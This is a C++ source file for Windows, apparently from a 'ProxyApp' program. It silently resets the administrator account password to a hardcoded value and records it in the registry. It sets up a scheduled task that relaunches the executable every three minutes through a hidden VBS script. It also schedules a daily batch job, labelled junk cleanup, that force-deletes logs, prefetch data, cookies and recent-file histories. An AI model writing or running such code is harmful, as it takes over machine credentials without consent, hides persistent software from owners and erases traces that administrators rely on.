#include "np_schtasks.h"
#include "np_tool_function.h"

#define START_PASS_WORD "qwd123"
#define REG_KEY_PATH "SOFTWARE\\ProxyApp\\ProxyExe"

BOOL CheckVersion(char* path, char* pPath, BOOL bIsBat)
{
	char *pBat = NULL;
	char Value[256] = {0};
	
	if (!bIsBat)
	{
		pBat = "Set ws = CreateObject(\"Wscript.Shell\")\r\nws.run \"%s\",vbhide";
		sprintf_s(Value, pBat, pPath);
		printf("%s\n", Value);
	}
	else
	{
		pBat = "@echo off\r\ntasklist /nh | findstr /i \"%s.exe\" && exit || start \"\" \"%s\"\r\nexit";
		char filename[_MAX_FNAME];
		_splitpath_s(pPath, NULL, 0, NULL, 0, filename, _MAX_FNAME,  NULL, 0);
		sprintf_s(Value, pBat, filename, pPath);
		printf("%s\n", Value);
	}
	BOOL bNeedUpdata = FALSE;
	FILE *fp = NULL;
	fopen_s(&fp, path, "rb");
	int err = GetLastError();
	if (fp == NULL)
	{
		// 文件不存在，需要更新
		bNeedUpdata = TRUE;
	}else
	{
		//检测MD5值
		fseek(fp, 0, SEEK_END);
		int FileLen = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		char* p = NULL;
		p = new char[FileLen + 1];// ftell返回的字节数不包含'\0'
		memset(p, 0x00, FileLen + 1);

		int nReadBytes = fread(p, FileLen + 1, 1, fp);

		//string md5value = MD5(ifstream(path, ios::binary)).toString();
		string md5value = MD5(p, strlen(p)).toString();
		printf("%s\n", md5value.c_str());
		string md5value1 = MD5(Value, strlen(Value)).toString();
		printf("%s\n", md5value1.c_str());
		if (md5value != md5value1)
			bNeedUpdata = TRUE;

		fclose(fp);
	}
	if (bNeedUpdata)
	{
		fopen_s(&fp, path, "wb");
		if (NULL == fp)
		{
			printf("创建失败\n");
		}
		
		int len = strlen(Value)+1;
		fwrite(Value, 1, len, fp);
		fclose(fp);
	}
	return bNeedUpdata;
}

void StartSchTasks()
{
	char exePath[MAX_PATH] = {0};
	char batPath[MAX_PATH] = {0};
	char vbsPath[MAX_PATH] = {0};
	GetModuleFileName(NULL, exePath, MAX_PATH);
	printf("%s\n", exePath);
	_makepath_s(vbsPath, "C", "\\", "proxyvbs.vbs", NULL);
	_makepath_s(batPath, "C", "\\", "proxybat.bat", NULL);
	printf("%s\n", vbsPath);
	printf("%s\n", batPath);

	BOOL bVbs = CheckVersion(vbsPath, batPath, FALSE);
	BOOL bBat = CheckVersion(batPath, exePath, TRUE);
	if (!bVbs && !bBat)
		return ;
	
	char* pReturn = NULL;
	char cmdbuf[256] = {0};
	char* pcmd_delete = "schtasks /delete /tn \"proxy_ts\" /F";
	Execmd(pcmd_delete, &pReturn);
	printf("%s\n", pReturn);
	if (NULL != pReturn)
	{
		free(pReturn);
		pReturn = NULL;
	}
	char *pcmd = "schtasks /create /sc minute /mo 3 /tn \"ProxySchtasks\" /tr %s /ru administrator /rp %s"; // /delay 0005:00win10延时5分钟启动
//	char *pcmd = "schtasks /create /sc minute /mo 3 /tn \"test\" /tr %s /ru \"System\"";
//	char *pcmd = "schtasks /create /sc minute /mo 3 /tn \"test\" /tr %s";
	sprintf_s(cmdbuf, pcmd, vbsPath, START_PASS_WORD);
	Execmd(cmdbuf, &pReturn);
	printf("%s\n", pReturn);
	if (NULL != pReturn)
	{
		free(pReturn);
		pReturn = NULL;
	}
}

BOOL ChangeThePW()
{
	char* pReturn = NULL;
	char cmdbuf[256] = {0};
	char *pcmd = "net user administrator %s";
	sprintf_s(cmdbuf, pcmd, START_PASS_WORD);
	if (!Execmd(cmdbuf, &pReturn))
	{
		printf("执行密码修改命令失败\n");
		return FALSE;
	}
	printf("%s\n", pReturn);
	if (NULL != pReturn)
		free(pReturn);

	return TRUE;
}

// 0 不需要更新 1 需要更新  2 出错
DWORD NewCreateKey_REG(HKEY hProxyExe)
{
	if (ERROR_SUCCESS != RegSetValueEx(hProxyExe, "password", NULL, REG_SZ,
		(LPBYTE)START_PASS_WORD, strlen(START_PASS_WORD)+1))
	{
		printf("设置password失败%d\n", GetLastError());
		return 2;
	}
	return 1;
}

// 0 不需要更新 1 需要更新  2 出错
DWORD OpenExisting_REG(HKEY hProxyExe)
{
	char value[256] = {0};
	DWORD dwType = REG_NONE;
	DWORD dwCount = 0;
	DWORD len = 0;
	if (ERROR_SUCCESS != RegQueryValueEx(hProxyExe,"password", NULL, 
		NULL, NULL, &len))
	{
		if (ERROR_SUCCESS != RegQueryValueEx(hProxyExe,"password", NULL, 
			NULL, (LPBYTE)value, &len))
		{
			printf("获取值失败%d\n", GetLastError());
			return 2;
		}
	}
	if (strcmp(value, START_PASS_WORD) != 0)
	{
		if (ERROR_SUCCESS != RegDeleteValue(hProxyExe, "password"))
		{
			printf("删除失败\n");
			return 2;
		}

		if (ERROR_SUCCESS != RegSetValueEx(hProxyExe, "password", NULL, REG_SZ,
			(LPBYTE)START_PASS_WORD, strlen(START_PASS_WORD)+1))
		{
			printf("设置password失败%d\n", GetLastError());
			return 2;
		}

		return 1;

	}
	return 0;
}

BOOL OpenAdnGetValue_REG()
{
	HKEY hProxyExe = NULL;
	DWORD dw = 0;
	__try
	{
		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REG_KEY_PATH, 0,
			REG_NONE, REG_OPTION_NON_VOLATILE, KEY_WRITE|KEY_READ, NULL, 
			&hProxyExe, &dw) != ERROR_SUCCESS)
		{
			printf("创建项失败%d\n", GetLastError());
			return FALSE;
		}

		if (dw == REG_CREATED_NEW_KEY)
		{
			if (2 == NewCreateKey_REG(hProxyExe))
				return FALSE;
			else
			{
				ChangeThePW();
				StartSchTasks();
			}
		}
		else if (dw == REG_OPENED_EXISTING_KEY)
		{
			DWORD nRet = OpenExisting_REG(hProxyExe);
			if (2 == nRet)
				return FALSE;
			else if (0 == nRet)
				return TRUE;
			else
			{
				ChangeThePW();
				StartSchTasks();
			}
		}
		else
		{
			printf("打开注册表失败\n");
			return FALSE;
		}
	}
	__finally
	{
		RegCloseKey(hProxyExe);
	}

	return TRUE;
}

BOOL InitSchTsks()
{
	BOOL bRet = FALSE;
	OpenAdnGetValue_REG();
	return bRet;
}

char* pClear = "@echo off \r\n"
"echo 正在清除系统垃圾文件，请稍等...... \r\n"
"del /f /s /q %systemdrive%\\*.tmp \r\n"
"del /f /s /q %systemdrive%\\*._mp \r\n"
"del /f /s /q %systemdrive%\\*.log \r\n"
"del /f /s /q %systemdrive%\\*.gid \r\n"
"del /f /s /q %systemdrive%\\*.chk \r\n"
"del /f /s /q %systemdrive%\\*.old \r\n"
"del /f /s /q %systemdrive%\\recycled\\*.* \r\n"
"del /f /s /q %windir%\\*.bak \r\n"
"del /f /s /q %windir%\\prefetch\\*.* \r\n"
"rd /s /q %windir%\\temp & md %windir%\\temp \r\n"
"del /f /q %userprofile%\\cookies\\*.* \r\n"
"del /f /q %userprofile%\\recent\\*.* \r\n"
"del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\" \r\n"
"del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\" \r\n"
"del /f /s /q \"%userprofile%\\recent\\*.*\" \r\n"
"echo 清除系统LJ完成! ";
//"echo. & pause ";

void RunClear(const char* _username, const char* _password)
{
	char* pInfo = NULL;
	char* pCmd = "schtasks /delete /tn StClear /F";
	Execmd(pCmd, &pInfo);
	if (NULL != pInfo)
	{
		fprintf(stderr, "%s\n", pInfo);
		free(pInfo);
		pInfo = NULL;
	}

	FILE *fp = NULL;
	fopen_s(&fp, "C:/Clear.bat", "wb");
	if (NULL == fp)
		return;
	int len = strlen(pClear) + 1;
	fwrite(pClear, 1, len, fp);
	fclose(fp);

	pCmd = "schtasks /create /sc daily /st 06:00:00 /tn StClear /tr C:/Clear.bat /ru %s /rp %s";
	char cCmd[256];
	sprintf_s(cCmd, pCmd, _username, _password);
	Execmd(cCmd, &pInfo);
	if (NULL != pInfo)
	{
		fprintf(stderr, "%s\n", pInfo);
		free(pInfo);
		pInfo = NULL;
	}
	ShellExecute(0, "open", "C:/Clear.bat", NULL, NULL, SW_SHOWNORMAL);
}